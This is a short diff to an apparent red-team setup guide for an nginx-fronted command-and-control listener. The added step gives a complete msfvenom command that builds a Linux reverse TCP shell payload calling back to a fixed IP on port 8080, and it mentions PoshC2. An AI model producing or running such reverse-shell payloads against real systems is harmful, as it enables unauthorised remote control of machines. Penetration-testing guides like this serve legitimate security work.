@@ -55,5 +55,9 @@
     ```bash 
     sudo systemctl restart nginx.service
     ```
-6. From here we can now create a msfvenom shell or poshc2 with the correct ports 
+6. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
+    ```bash
+   msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.178.132 LPORT=8080 -a x64 -f elf > yup.elf
+    ```
+    > NOTE: Follow the same setup if you are using poshc2 for you bind port, probably 
 7. tada you have a beacon shelly, fuck you.
